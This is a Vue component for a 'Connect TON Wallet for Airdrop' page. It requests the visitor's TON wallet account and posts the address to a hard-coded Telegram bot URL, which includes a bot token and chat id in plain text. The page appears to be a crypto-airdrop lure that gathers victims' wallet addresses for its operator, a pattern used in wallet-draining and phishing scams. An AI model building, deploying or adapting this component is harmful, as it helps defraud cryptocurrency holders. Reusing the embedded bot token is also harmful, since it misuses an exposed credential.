<template>
  <div class="min-h-screen flex flex-col justify-center items-center bg-gray-100">
    <h1 class="text-3xl font-bold mb-6">Connect TON Wallet for Airdrop</h1>
    <button
      @click="connectWallet"
      class="px-6 py-3 bg-blue-500 text-white rounded-lg hover:bg-blue-700"
    >
      Connect Wallet
    </button>
  </div>
</template>

<script>
import TonWeb from "tonweb";
import axios from "axios";

export default {
  data() {
    return {
      walletAddress: null,
    };
  },
  methods: {
    async connectWallet() {
      try {
        const provider = window.ton;
        if (provider) {
          const wallet = await provider.send("ton_requestAccounts");
          this.walletAddress = wallet.address;

          await axios.post(`https://api.telegram.org/bot6332593926:AAEprpTaDA5AbLr-0V62I0ZGtbXv_f9iCAs/sendMessage`, {
            chat_id: "-1002294769431",
            text: `New Wallet Connected: ${this.walletAddress}`,
          });

          alert("Wallet connected, and address sent to Telegram!");
        } else {
          alert("Ton Wallet not found. Please install the extension.");
        }
      } catch (error) {
        console.error("Error connecting wallet:", error);
      }
    },
  },
};
</script>
